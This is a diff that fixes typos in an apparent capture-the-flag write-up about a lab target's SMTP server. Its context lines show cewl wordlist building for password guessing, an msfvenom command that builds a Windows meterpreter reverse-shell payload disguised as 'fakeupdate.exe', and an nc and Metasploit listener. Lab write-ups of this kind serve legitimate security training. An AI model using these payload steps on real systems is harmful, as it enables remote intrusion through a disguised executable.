@@ -124,7 +124,7 @@ pcathrine@brownbrick.co
 fstamatis@brownbrick.co
 ```
 
-### SMPT(Port 25)
+### SMTP(Port 25)
 
 ```jsx
 25/tcp    open  smtp          syn-ack ttl 125 hMailServer smtpd
@@ -133,7 +133,7 @@ fstamatis@brownbrick.co
 
 ```
 
-- Enumerating SMPT, I used the cewl command to create a custom word-list against the emails found in their contact page. I was unsuccessful until I used the - -**lowercase** flag in cewl which provided me a way as seen below.
+- Enumerating SMTP, I used the cewl command to create a custom word-list against the emails found in their contact page. I was unsuccessful until I used the - -**lowercase** flag in cewl which provided me a way as seen below.
 
 ```bash
 
@@ -197,10 +197,10 @@ since none of the above worked tried logging into the email to find information 
 #creating the payload and stating the listner 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.84.253 LPORT=1337 -f exe > fakeupdate.exe
 
-#listining on the specified port. 
+#listening on the specified port. 
 nc -nvlp 1337 
 
-#^realised the above will not work, and I need to use msf6 to actually get a resvese shell
+#^realised the above will not work, and I need to use msf6 to actually get a reverse shell
 
 msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.13.84.253:1337 
